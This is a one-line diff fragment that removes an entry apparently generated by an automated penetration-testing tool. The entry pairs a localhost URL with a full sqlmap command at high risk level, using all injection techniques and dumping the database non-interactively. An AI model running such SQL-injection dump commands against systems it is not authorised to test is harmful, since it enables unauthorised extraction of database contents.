@@ -1,1 +1,0 @@
-http://127.0.0.1:80//?name=table&name=* (GET)  # Binaries\sqlmap\sqlmap.py --level=2 --risk=3 -v 0 --dump --technique=BEQSU --batch -o --output-dir=Results\127.0.0.1\80\SQLi -u \"127.0.0.1:80//?name=table&name=*\"
